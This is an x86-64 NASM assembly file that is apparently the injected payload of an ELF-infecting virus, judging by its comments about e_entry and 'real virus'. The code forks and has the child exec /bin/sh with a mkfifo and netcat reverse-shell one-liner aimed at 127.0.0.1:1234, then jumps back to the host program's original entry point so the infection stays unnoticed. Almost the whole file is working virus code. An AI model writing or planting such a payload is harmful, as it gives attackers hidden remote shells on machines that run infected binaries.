[BITS 64]
; 0x1040 - e_entry
; location of start = 0x1350 offset
call tmp	; 5 bytes
tmp:
pop rbx		; 1 byte
jmp short next	; short jmp (1 byte within) - 2 BYTES
sh db "/bin/sh", 0 ; 8 bytes
shlen equ $-sh
; make argv on stack
hyphenc db "-c", 0 ;3
hyphenclen equ $-hyphenc
cmd db "echo REVSH;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f", 0 ;
cmdlen equ $-cmd

next: ; MAN
sub rbx, 5 ; 1 byte for call, 4 for OFFSET (8 would be for absolute)
push rdi ; argc
push rsi ; argv
push rdx ; envp
sub rsp, 8 ; 16 byte aligned

; note ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; win func = 0x1126 offset
; call printwin
mov rax, 57 ; fork
syscall
cmp rax, 0
je short child_process
jmp cleanup

child_process:
; system call 
; build argv
call printwin
push 0 ; null terminator
lea rax, [rbx+8+shlen+hyphenclen] ; cmd
push rax
lea rax, [rbx+8+shlen] ; hyphenc
push rax
lea rax, [rbx+8] ; sh
push rax
; do the caling
mov rax, 59
lea rdi, [rbx+8] ; sh
lea rsi, [rsp]
mov rdx, 0 ; [rbx+8+8+3+cmdle] ; envp (NULL)
syscall ; exeve("/bin/sh", {"/bin/sh", "-c", "ls", 0}, 0)
call printwin
add rsp, 32 ; clean up stack
mov rax, 60
mov rdi, 0
syscall
; note ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; MAN
cleanup:
add rsp, 8 ; 16 bytes aligned
pop rdx
pop rsi
pop rdi

; go back to original e_entry
lea rax, [rbx+0x12345678] ; 0x1350-0x1040 = 0x310
jmp rax


printwin:
ret ; won't use this in real virus, so retting. avoid offset complications.
push rax
lea rax, [rbx+0x0]
call rax
pop rax
ret

